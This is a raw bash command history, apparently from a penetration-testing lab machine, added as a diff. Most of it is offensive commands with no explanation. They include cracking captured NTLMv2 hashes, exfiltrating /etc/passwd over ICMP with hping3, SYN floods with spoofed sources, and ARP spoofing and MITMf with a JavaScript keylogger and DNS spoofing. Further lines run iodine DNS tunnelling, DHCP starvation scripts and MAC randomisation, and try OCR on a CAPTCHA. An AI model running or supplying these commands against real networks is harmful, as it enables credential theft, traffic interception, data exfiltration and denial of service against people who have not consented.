+  416  john --fork=2 --format=NTLMv2 /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  417  john --fork=4  /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  418  john --fork=4 --format=netntlmv2  /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  419  vi /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  420  john --fork=4 --format=netntlmv2  /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  421  john --fork=4   /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  422  apt-get update
+  423  apt-get install tor -y
+  424  /etc/init.d/tor start
+  425  ps -ef | grep tor | grep -v grep
+  426  netstat -nlput
+  427  apt-get install proxychains -y 
+  428  apt-get install tor proxychains -y
+  429  /etc/init.d/tor restart
+  430  netstat -nlput
+  431  pkill iodine
+  432  route -n
+  433  dhclient eth0 -v
+  434  route -n
+  435  route del -host 107.170.207.62 dev eth0
+  436  route del -host 213.74.0.3 dev eth0
+  437  route -n
+  438  ifconfig 
+  439  hping3 10.10.15.159 --icmp --sign GONDER -d 50 -c 1 --file /etc/passwd
+  440  echo "izmitsu" > gonderbeni.txt
+  441  echo "tskb.com.tr" >> gonderbeni.txt
+  442  cat gonderbeni.txt 
+  443  hping3 10.10.15.159 --icmp --sign GONDER -d 50 -c 1 --file gonderbeni.txt 
+  444  dhclient eth0 -v
+  445  nmap -n -Pn -sS --top-ports 100 172.16.155.147 --open
+  446  hping3 -S -p 445 172.16.155.147 --flood --rand-source -d 64 -w 128 &
+  447  fg
+  448  gf
+  449  fg
+  450  hping3 -S -p 445 172.16.155.147 --flood --rand-source -d 64 -w 128 &
+  451  fg
+  452  history >> /var/www/html/komutlar3.txt 
+  453  ifconfig 
+  454  hostname pentest
+  455  tcpdump -tttnn -i eth0 host 10.10.15.33
+  456  tcpdump -tttnn -i eth0 host 10.10.15.33 not arp 
+  457  tcpdump -tttnn -i eth0 host 10.10.15.33 and not ARP   
+  458  tcpdump -tttnn -i eth0 host 10.10.15.33 and not arp
+  459  tcpdump -tttnn -i eth0 host 10.10.15.33 and proto TCP
+  460  ifconfig 
+  461  /etc/init.d/apache2 restart
+  462  ifconfig 
+  463  /etc/init.d/apache2 restart
+  464  tail -f /var/log/apache2/access.log
+  465  tcpdump -tttnn -i lo port 80 -s 0 -w analiz.pcap
+  466  wireshark  analiz.pcap 
+  467  hping -c 1 -p 80 www.google.com -S 
+  468  hping3 -c 1 -p 80 www.google.com -S 
+  469  hping3 -c 1 -p 81 www.google.com -S 
+  470  hping3 -c 1 -p 80 www.google.com -F
+  471  hping3 -c 1 -p 80 -a 1.1.1.2 10.10.15.5 -S
+  472  hping3 -c 2 -p 80 --rand-source  10.10.15.5 -S
+  473  tcpdump -tttnn -i eth0
+  474  tcpdump -tttnn -i eth0 host 94.73.147.83
+  475  ping google.com -c 2
+  476  hping3 -S -p 80 -a 192.168.1.2 google.com -c 1
+  477  hping3 -S -p 80 10.10.10.1 -c 1 
+  478  hping3 -S -p 80 10.10.10.2 -c 1
+  479  tcpdump -tttnn -i eth0 proto UDP -s 0 -w dns.pcap
+  480  tcpdump -tttnn -i eth0 proto UDP and port 53 -s 0 -w dns.pcap
+  481  tcpdump -tttnn -r dns.pcap  -XX
+  482  wireshark  dns.pcap 
+  483  cd /root/Desktop/
+  484  ls -l
+  485  file dns.dat 
+  486  cat dns.dat 
+  487  hping3 --udp -c 1 -p 53 -E dns.dat  -d 64 172.16.155.2
+  488  hping3 --udp -c 1 -p 53 -E dns.dat  -a 1.1.1.1 -d 64 172.16.155.2
+  489  dig www.izmitsu.com.tr A +short
+  490  hping3 --udp -c 1 -p 53 -E dns.dat  -a 1.1.1.1 -d 64 172.16.155.2
+  491  hping3 --udp -c 1 -p 53 -E dns.dat  -d 64 172.16.155.2
+  492  wireshark 
+  493  cd ..
+  494  history  >> /var/www/html/komutlar2.txt 
+  495  /etc/init.d/apache2 restart
+  496  dhclient eth0 -v
+  497  /etc/init.d/apache2 restart
+  498  ls -la /var/www/html/
+  499  ls -l
+  500  cd /pentest/
+  501  ls -l
+  502  cd /root/
+  503  ls -l
+  504  rm -rf 445-UP.* AppGuard_LogParser_Script/ cikti  css-20190929T065512Z-001.zip  dns.pcap  font-20190929T065508Z-001.zip img-20190929T065457Z-001.zip ipler.txt kaydet.pcap  MS-17-010.*
+  505  ls -l
+  506  rm -rf ping.pcap  up.* windows.txt  js-20190929T073324Z-001.zip  Log*
+  507  ls -l
+  508  rm -rf analiz.pcap 
+  509  ls -l
+  510  dhclient eth0 -v
+  511  nmap -n -Pn -sS -p 1-10 192.168.1.13
+  512  knock 192.168.1.13 7000 8000 9000 
+  513  nmap -n -Pn -sS -p 22 192.168.1.13
+  514  ifconfig 
+  515  dhclient eth0 -v
+  516  nmap -n -Pn -sS -p 22 192.168.1.13
+  517  knock 192.168.1.13 7000 8000 9000 
+  518  nmap -n -Pn -sS -p 22 192.168.1.13
+  519  knock 192.168.1.13 7000 8000 9000 
+  520  nmap -n -Pn -sS -p 22 192.168.1.13
+  521  knock 192.168.1.13 9000 8000 7000
+  522  nmap -n -Pn -sS -p 22 192.168.1.13
+  523  knock 192.168.1.13 7000 8000 9000 
+  524  nmap -n -Pn -sS -p 22 192.168.1.13
+  525  dhclient eth0 -v
+  526  arp-scan -l -I eth0 
+  527  arp-scan -l -I eth0  | grep -E "^[0-9]"
+  528  arp-scan -l -I eth0  | grep -Eo "^[0-9]"
+  529  arp-scan -l -I eth0  | grep -E "^[0-9]{1,3}\."
+  530  arp-scan -l -I eth0  | grep -Eo "^[0-9]{1,3}\." | head -10 
+  531  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}" | head -10 
+  532  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+" | head -10 
+  533  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+[0-9a-fA-F]{2}:" | head -5
+  534  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([0-9a-fA-F]{2}:){5}" | head -5
+  535  arp-scan -l -I eth0  | grep -Eo "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}\s+" | head -5
+  536  arp-scan -l -I eth0  | grep -E "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}\s+" | head -5
+  537  arp-scan -l -I eth0  | grep -E "^([0-9]{1,3}\.){3}[0-9]{1,3}\s+([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}\s+.*" | head -5
+  538  vi tmp
+  539  cat tmp
+  540  cat tmp | grep "https://tr.linkedin.com"
+  541  cat tmp | grep  -B1 "https://tr.linkedin.com"
+  542  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http
+  543  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-"
+  544  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1
+  545  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-3
+  546  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2
+  547  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2 | tr [A-Z] [a-z]
+  548  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2 | tr [A-Z] [a-z] | tr -s " " "."
+  549  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2 | tr [A-Z] [a-z] | tr -s " " "." | sed -e "s/Ö/O/g"
+  550  cat tmp | grep  -B1 "https://tr.linkedin.com" | grep -v http | grep -Ev "^-" | cut -d " " -f1-2 | tr [A-Z] [a-z] | tr -s " " "." | sed -e "s/Ö/o/g"
+  551  ssh 107.170.207.62 -p 443
+  552  echo "deneme" | md5sum
+  553  echo "denem" | md5sum
+  554  ssh 107.170.207.62 -p 443
+  555  ssh 107.170.207.62 -p 443 -l cihat
+  556  ssh 107.170.207.62 -p 443 -l cihat -D 8080
+  557  tcpdump -tttnn -i eth0 proto TCP and port 21 -s 0 -w ftp.pcap
+  558  wireshark ftp.pcap 
+  559  tcpdump -tttnn -i eth0 host 172.16.155.138 and proto TCP and port 21 -s 0 -w ftp.pcap
+  560  wireshark ftp.pcap 
+  561  tcpdump -tttnn -i eth0 host 172.16.155.138 and proto TCP and port 80 -s 0 -w http.pcap
+  562  wireshark http.pcap 
+  563  cd /pentest/MITMf/
+  564  apt-cache search mitmf
+  565  apt-cache search mitm
+  566  ./mitmf.py 
+  567  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.140 --arp --spoof 
+  568  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof 
+  569  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --upsidedownternet
+  570  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --screen 
+  571  /etc/init.d/apache2 stop
+  572  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --upsidedownternet
+  573  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --screen
+  574  ./mitmf.py --help | grep js
+  575  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --jskeylogger
+  576  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --screen
+  577  ls -l
+  578  ls -la tests/
+  579  ls -la tools/
+  580  ls -la plugins/
+  581  ls -la lo
+  582  ls -la logs/
+  583  ls -la logs/dns/
+  584  ls -l
+  585  ls -la config/
+  586  vi config/mitmf.conf 
+  587  ./mitmf.py -i eth0 --gateway 172.16.155.2 --target 172.16.155.138 --arp --spoof  --dns 
+  588  tcpdump -tttnn -i eth0
+  589  cd /root/
+  590  msfconsole 
+  591  w
+  592  who
+  593  tty
+  594  w
+  595  ping filehsaring
+  596  cat /usr/share/responder/logs/SMBv2-NTLMv2-SSP-172.16.155.138.txt
+  597  cat /etc/apt/sources.list
+  598  vi /etc/proxychains.conf 
+  599  cat /etc/proxychains.conf  | grep -Ev "^$|^#"
+  600  proxychains firefox https://check.torproject.org/
+  601  cat /etc/proxychains.conf  | grep -Ev "^$|^#"
+  602  proxychains firefox https://check.torproject.org/
+  603  dig tskb.com.tr A +trace
+  604  dhclient eth0 -v
+  605  dig tskb.com.tr A +trace
+  606  dig tunnel.meterpreter.net NS +trace
+  607  dig tunnel.meterpreter.net NS +short
+  608  iodine tunnel.meterpreter.net 
+  609  ps -ef | grep iodie
+  610  ps -ef | grep iodi
+  611  ifconfig 
+  612  ping 192.168.100.1
+  613  ps -ef | grep iod
+  614  kill -9 10614
+  615  route -n
+  616  route del default
+  617  route -n
+  618  dhclient eth0 v
+  619  dhclient eth0 -v
+  620  cat /etc/resolv.conf 
+  621  route -n
+  622  route del default
+  623  route -n
+  624  route add -host 107.170.207.62 gw 10.10.15.5 dev eth0 
+  625  route add -host 213.74.0.3 gw 10.10.15.5 dev eth0 
+  626  route -n
+  627  iodine tunnel.meterpreter.net 
+  628  ifconfig 
+  629  route -n
+  630  route add default gw 192.168.100.1
+  631  route -n
+  632  ping google.com 
+  633  tcpdump -tttnn -i eth0 
+  634  tcpdump -tttnn -i eth0  -XX
+  635  tcpdump -tttnn -i eth0  port 53
+  636  top -c
+  637  nload eth0 
+  638  ifconfig 
+  639  history  >> /var/www/html/komutlar.txt
+  640  history  >> /var/www/html/komutlar3.txt
+  641  ifconfig 
+  642  dhclient eth0 -v
+  643  ifconfig 
+  644  setoolkit 
+  645  history  >> /var/www/html/komutlar3.txt 
+  646  ifconfig 
+  647  /etc/init.d/apache2 restart
+  648  iptables -L -n -t nat
+  649  iptables -L -n 
+  650  write root tty/7
+  651  write root tty7
+  652  w
+  653  tty2
+  654  tty
+  655  w
+  656  write root tty3
+  657  tty
+  658  ifconfig 
+  659  dhclient eth0 -v
+  660  route -n
+  661  ifconfig 
+  662  sysctl  -a | grep forward
+  663  sysctl  -w net.ipv4.ip_forward=1
+  664  route -n
+  665  arpspoof -i eth0 -t 172.16.35.114 172.16.35.254
+  666  ifconfig 
+  667  setoolkit 
+  668  hostname
+  669  hostname pentest
+  670  tcpdump -tttnn -i eth0 port 80 and proto TCP -s 0 -w http.pcap
+  671  wireshark  http.pcap 
+  672  cd MITMf/
+  673  ls -la
+  674  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.254 --arp --spoof
+  675  vi config/mitmf.conf 
+  676  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.254 --arp --spoof --dns
+  677  vi config/mitmf.conf 
+  678  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.254 --arp --spoof --dns
+  679  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.254 --arp --spoof 
+  680  ./mitmf.py  -i eth0 --target 172.16.35.114 --gateway 172.16.35.0/22 --arp --spoof 
+  681  ./mitmf.py  -i eth0 --target 172.16.35.0/22 --gateway 172.16.35.254 --arp --spoof 
+  682  bg
+  683  ps -ef | grep mit
+  684  kill -9 1535
+  685  cd /root/
+  686  hostname pentest
+  687  msfconsole 
+  688  leafpad 
+  689  ifconfig 
+  690  iwconfig 
+  691  dmesg 
+  692  shutdown -h now
+  693  ifconfig 
+  694  dhclient eth0 -v
+  695  pkill dhclient
+  696  ifconfig 
+  697  ifconfig  eth0 
+  698  macchanger  -r eth0 
+  699  dhclient eth0 
+  700  ifconfig  eth0
+  701  ifconfig 
+  702  tcpdump -tttnn -i eth0 proto UDP
+  703  tcpdump -tttnn -i eth0 proto UDP and port 67
+  704  ifconfig 
+  705  route -n
+  706  route del default
+  707  route add default gw 172.16.32.77
+  708  route -n
+  709  ping google.com -c 2
+  710  route del default
+  711  route add default gw 172.16.35.5
+  712  ping google.com -c 2
+  713  sysctl  -a | grep redirec
+  714  sysctl  -a | grep icmp
+  715  sysctl  -w net.ipv4.icmp_echo_ignore_all=1
+  716  ping google.com -c 2
+  717  traceroute 8.8.8.8
+  718  pkill dhclient
+  719  ifconfig  eth0 
+  720  macchanger  -r eth0 
+  721  dhclient eth0 
+  722  ifconfig  eth0 
+  723  cd MITMf/
+  724  ls -la
+  725  ./mitmf.py -i eth0 --target 172.26.1.190 --gateway 172.26.1.1 --arp --spoof
+  726  ./mitmf.py -i eth0 --target 172.26.1.0/24 --gateway 172.26.1.1 --arp --spoof
+  727  jobs -l
+  728  kill -9 6765
+  729  ./mitmf.py -i eth0 --target 172.26.1.190 --gateway 172.26.1.1 --arp --spoof
+  730  ./mitmf.py -i eth0 --target 172.26.1.190 --gateway 172.26.1.254 --arp --spoof
+  731  cd ..
+  732  ls -l
+  733  cd mI
+  734  cd MITMf/
+  735  ./mitmf.py -i eth0 --target 172.26.1.190 --gateway 172.26.1.254 --arp --spoof
+  736  ifconfig
+  737  ping google.com
+  738  ifconfig 
+  739  pkill dhclient
+  740  ifconfig 
+  741  cat /etc/resolv.
+  742  cat /etc/resolv.conf 
+  743  ip addr del 172.26.1.151 dev eth0 
+  744  ifconfig 
+  745  ifconfig  eth0 172.26.1.182 netmask 255.255.255.0 up
+  746  route add default gw 172.26.1.254
+  747  echo "nameserver 172.26.1.1" > /etc/resolv.
+  748  echo "nameserver 172.26.1.1" > /etc/resolv.conf 
+  749  rm -rf /etc/resolv.
+  750  ping google.com
+  751  ifconfig 
+  752  route -n
+  753  cat /etc/resolv.conf 
+  754  echo "nameserver 172.26.1.254" > /etc/resolv.conf 
+  755  ping google.com
+  756  ifconfig 
+  757  netstat -nlput
+  758  tcpdump -tttnn -i eth0 port 67
+  759  tcpdump -tttnn -i eth0 port 67 -s 0 -XX
+  760  ifconfig 
+  761  route -n
+  762  ./mitmf.py  -i eth0 --gateway 192.168.33.1 --target 192.168.33.28  --arp --spoof
+  763  ./mitmf.py  -i eth0 --gateway 192.168.33.1 --target 192.168.33.0/24  --arp --spoof
+  764  bg
+  765  jobs -l
+  766  kill -9 9252
+  767  vi config/mitmf.conf 
+  768  ifconfig 
+  769  vi config/mitmf.conf 
+  770  ./mitmf.py  -i eth0 --gateway 192.168.33.1 --target 192.168.33.0/24  --arp --spoof --dns
+  771  bg
+  772  fg
+  773  ./mitmf.py  -i eth0 --gateway 192.168.33.1 --target 192.168.33.28  --arp --spoof --dns
+  774  dmesg 
+  775  msfconsole 
+  776  ls -l
+  777  rm -rf 1 
+  778  rm -rf http.pcap 
+  779  less dhcp_starvation.sh 
+  780  rm -rf dhcp_starvation.sh 
+  781  ls -l
+  782  chmod 755 gonder.py 
+  783  ./gonder.py 
+  784  vi gonder.py 
+  785  ./gonder.py 
+  786  cat gonder.py 
+  787  vi gonder.py 
+  788  cat gonder.py 
+  789  ./gonder.py 
+  790  ping google.com
+  791  dhclient eth0 
+  792  ./gonder.py 
+  793  rm -rf gonder.py 
+  794  ls -l
+  795  rm -rf http.pcap 
+  796  dhclient eth0 -v
+  797  ls -l
+  798  ./dhcp_exhaust.sh 
+  799  ./dhcp_exhaust.sh eth0 3
+  800  journalctl  -xe
+  801  /etc/init.d/network-manager stop
+  802  pkill dhclient
+  803  ./dhcp_exhaust.sh eth0 3
+  804  hostname pentest
+  805  ifconfig 
+  806  route -n
+  807  netstat -nlput
+  808  tcpdump -tttnn -i eth0 port 67
+  809  vi config/mitmf.conf 
+  810  /usr/sbin/tor
+  811  ifconfig 
+  812  pkill dhclient
+  813  ifconfig  eth0
+  814  ./dhcp_exhaust.sh  eth0 2
+  815  ifconfig  eth0
+  816  msfconsole 
+  817  ifconfig 
+  818  iwconfig 
+  819  ifconfig  -a
+  820  dmesg 
+  821  lsmod  | grep ath
+  822  rmmod  ath9k_htc
+  823  lsmod  | grep ath
+  824  rmmod  ath9k_common
+  825  rmmod  ath9k_hw
+  826  lsmod  | grep ath
+  827  modprobe ath9k_common
+  828  modprobe ath9k_hw
+  829  modprobe ath9k_htc
+  830  lsmod  | grep ath
+  831  dmesg 
+  832  ifconfig 
+  833  ifconfig  -a
+  834  iwconfig 
+  835  dmesg 
+  836  lsmod  | grep ath
+  837  ls -al /lib/firmware/htc_9271.fw
+  838  dhclient eth0 -v
+  839  apt-get clean all; apt-get update; apt-get install firmware-linux -y
+  840  ifconfig 
+  841  ifconfig  -a
+  842  iwconfig 
+  843  dmesg 
+  844  ifconfig  -a
+  845  iwconfig 
+  846  iwconfig wlan0 mode monitor
+  847  ifconfig 
+  848  iwconfig 
+  849  ifconfig 
+  850  ifconfig  -a
+  851  dhclient et0 -v
+  852  dhclient eth0 -v
+  853  ifconfig 
+  854  ifconfig  eth0 down
+  855  macchanger  -r eth0 
+  856  dhclient eth0 -v
+  857  ifconfig  eth0 up
+  858  dhclient eth0 -v
+  859  ./dhcp_starvation.sh --help
+  860  ./dhcp_starvation.sh eth0 5
+  861  setoolkit 
+  862  ls -l
+  863  rm -rf 1 tmp ftp.pcap  gonderbeni.txt  http.pcap 
+  864  ls -l
+  865  dhclient eth0 -v
+  866  pkill dhclient
+  867  ifconfig 
+  868  dhclient eth0 -v
+  869  ifconfig 
+  870  route -n
+  871  sysctl  -a | grep forward
+  872  sysctl -w net.ipv4.ip_forward=1
+  873  ifconfig 
+  874  sysctl -w net.ipv4.ip_forward=1
+  875  ifconfig 
+  876  arpspoof  -i eth0 -t 172.26.1.190 172.26.1.1
+  877  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  878  wireshark  http.pcap 
+  879  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  880  wireshark  http.pcap 
+  881  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  882  rm -rf http.pcap 
+  883  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  884  wireshark  http.pcap 
+  885  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  886  sysctl  -a | grep forward
+  887  sysctl  -w net.ipv4.ip_forward=1
+  888  tcpdump -tttnn -i eth0 host 172.26.1.190 -s 0 -w http.pcap
+  889  ./dhcp_exhaust.sh -i eth0 3
+  890  ./dhcp_exhaust.sh eth0 3
+  891  dhclient eth0 -v
+  892  ./dhcp_exhaust.sh eth0 3
+  893  pkill dhclient
+  894  ifconfig  eth0 
+  895  macchanger  -r eth0 
+  896  dhclient eth0 
+  897  ifconfig eth0
+  898  hostname pentest
+  899  netstat -nlput
+  900  tcpdump -tttnn -i eth0 port 67
+  901  sysctl  -a | grep forward
+  902  iptables -L -n
+  903  iptables -L -n -t nat
+  904  iptables --flush -t nat
+  905  iptables -L -n -t nat
+  906  tcpdump -tttnn -i eth0 port 67
+  907  ps -ef | grep mimt
+  908  ps -ef | grep mitm
+  909  kill -9 9335
+  910  ifconfig 
+  911  pkill dhclient
+  912  ifconfig 
+  913  /etc/init.d/network-manager restart
+  914  ifconfig 
+  915  ifconfig  -a
+  916  iwconfig 
+  917  /etc/init.d/network-manager restart
+  918  ifconfig 
+  919  /etc/init.d/network-manager restart
+  920  ifconfig 
+  921  iwconfig 
+  922  ifconfig 
+  923  iwconfig 
+  924  /etc/init.d/apache2 start
+  925  ifconfig 
+  926  vi gonder.py
+  927  tcpdump -tttnn -i eth0 port 80 -s 0 
+  928  tcpdump -tttnn -i lo port 80 -s 0 
+  929  tcpdump -tttnn -i lo port 80 -s 0 -w http.pcap
+  930  wireshark  http.pcap 
+  931  vi gonder.py 
+  932  tcpdump -tttnn -i eth0 port 80 -s 0 -w http.pcap
+  933  wireshark  http.pcap 
+  934  /etc/init.d/network-manager restart
+  935  ifconfig 
+  936  ifconfig  -a
+  937  iwconfig 
+  938  dmesg 
+  939  ifconfig  -a
+  940  iwconfig 
+  941  /etc/init.d/network-manager restart
+  942  /etc/init.d/network-manager stop
+  943  /etc/init.d/network-manager start
+  944  dmesg 
+  945  ifconfig -a
+  946  iwconfig 
+  947  shutdown -r now
+  948  cd ..
+  949  /etc/init.d/network-manager stop
+  950  ifconfig 
+  951  route -n
+  952  ls -l
+  953  rm -rf 1 
+  954  ./dhcp_exhaust.sh 
+  955  ./dhcp_exhaust.sh eth0 3
+  956  dhclient eth0 -v
+  957  ifconfig  eth0 
+  958  ifconfig 
+  959  ifconfig  eth0 
+  960  macchanger  -r eth0 
+  961  dhclient eth0 
+  962  hostname pentest
+  963  ping hurriyet.com.tr
+  964  tcpdump -tttnn -i eth0 port 443 and host 34.249.120.252 -s 0 -w sample.pcap
+  965  tcpdump -tttnn -i eth0 port 443 and host 34.249.120.252 and proto TCP -s 0 -w sample.pcap
+  966  tcpdump -tttnn -r sample.pcap 
+  967  mv sample.pcap  /var/www/html/
+  968  cd /var/www/html/
+  969  ls -la
+  970  tcpdump -tttnn -r sample.pcap  -c 10 
+  971  tcpdump -tttnn -r sample.pcap  -c 20 | more 
+  972  tcpdump -tttnn -r sample.pcap  | more
+  973  tcpdump -tttnn -r sample.pcap  | less
+  974  tcpdump -tttnn -r sample.pcap  
+  975  tcpdump -tttnn -r sample.pcap -c 20 
+  976  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2
+  977  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f1
+  978  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f2
+  979  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 
+  980  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f2
+  981  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f2 | tr -d ":" 
+  982  tcpdump -tttnn -r sample.pcap -c 20 | cut -d ">" -f2 | cut -d " " -f2 | tr -d ":"  | sort -n | uniq -c
+  983  tcpdump -tttnn -r sample.pcap  | cut -d ">" -f2 | cut -d " " -f2 | tr -d ":"  | sort -n | uniq -c
+  984  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1
+  985  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1 
+  986  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}'
+  987  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-3
+  988  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4
+  989  geoiplookup
+  990  geoiplookup 54.29.9.120
+  991  geoiplookup 54.29.9.120 | cut -d ":" -f2
+  992  geoiplookup 54.29.9.120 | cut -d ":" -f2 | cut -d " " -f2
+  993  geoiplookup 54.29.9.120 | cut -d ":" -f2 | cut -d " " -f2 | tr -d ","
+  994  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4
+  995  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4 | while read ip; do geoiplookup $ip | cut -d ":" -f2 | cut -d " " -f2 | tr -d ","; done
+  996  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4 | while read ip; do geoiplookup $ip | cut -d ":" -f2 | cut -d " " -f2 | tr -d ","; done | sort -n | uniq -c | sort -n
+  997  tcpdump -tttnn -r sample.pcap  -c 20 | cut -d ">" -f1  | awk -F " " '{print $3}' | cut -d "." -f1-4 | while read ip; do geoiplookup $ip | cut -d ":" -f2 | cut -d " " -f2 | tr -d ","; done | sort -n | uniq -c | sort -nr
+  998  vi script1.sh
+  999  cat script1.sh 
+ 1000  chmod 755 script1.sh 
+ 1001  ./script1.sh 
+ 1002  vi script1.sh 
+ 1003  cat script1.sh 
+ 1004  ./script1.sh 
+ 1005  ./script1.sh  | sort -n | uniq -c | sort -nr
+ 1006  cat script1.sh 
+ 1007  tcpdump -tttnn -r sample.pcap  -c 40 
+ 1008  cat script1.sh 
+ 1009  ps -ef | grep ssh 
+ 1010  ps -ef | grep ssh  | while read pid; do kill -9 $pid 2>/dev/null ; done
+ 1011  ps -ef | grep ssh 
+ 1012  ps -ef | grep ssh  
+ 1013  ps -ef | grep ssh   | awk '{print $2}' | while read pid; do kill -9 $pid 2>/dev/null ; done
+ 1014  ps -ef | grep ssh  
+ 1015  echo "deneme"
+ 1016  echo "deneme" | sed -e "s/e/E/g"
+ 1017  echo "deneme" > test.txt
+ 1018  cat test.txt 
+ 1019  cat test.txt | sed -e "s/e/E/g" > test.txt2; rm -rf test.txt; mv test.txt2 test.txt 
+ 1020  cat test.txt 
+ 1021  history  >> history1.txt 
+  164  ruby policy_parse.rb  -l Agent6.3.7_JTBGroup_HBU.csv  -s solutions.csv > /root/Desktop/report.html
+  165  cp ../AppGuard_LogParser_Script/solutions.csv .
+  166  ruby policy_parse.rb  -l Agent6.3.7_JTBGroup_HBU.csv  -s solutions.csv > /root/Desktop/report.html
+  167  ruby policy_parse.rb  Agent6.3.7_JTBGroup_HBU.csv   solutions.csv > /root/Desktop/report.html
+  168  cd /root/Desktop/
+  169  ls -la
+  170  dhclient eth0 -v
+  171  apt-get clean all; apt-get update
+  172  apt-cache search tesseract
+  173  apt-cache search tesseract | more
+  174  apt-get install tesseract-ocr -y 
+  175  tesseract --help
+  176  man tesseract
+  177  tesseract CaptchaImage.jpeg --psm 8 
+  178  tesseract CaptchaImage.jpeg --psm 9 
+  179  tesseract CaptchaImage.jpeg 
+  180  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg 
+  181  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 0
+  182  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 1
+  183  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 2
+  184  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 
+  185  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 3
+  186  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 4
+  187  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 5
+  188  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 6
+  189  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 7
+  190  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 5
+  191  cat CaptchaImage2.jpeg.txt 
+  192  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 6
+  193  cat CaptchaImage2.jpeg.txt 
+  194  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 7
+  195  cat CaptchaImage2.jpeg.txt 
+  196  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 8
+  197  cat CaptchaImage2.jpeg.txt 
+  198  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 9
+  199  cat CaptchaImage2.jpeg.txt 
+  200  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 10
+  201  cat CaptchaImage2.jpeg.txt 
+  202  tesseract CaptchaImage.jpeg CaptchaImage2.jpeg --psm 6
+  203  cat CaptchaImage2.jpeg.txt 
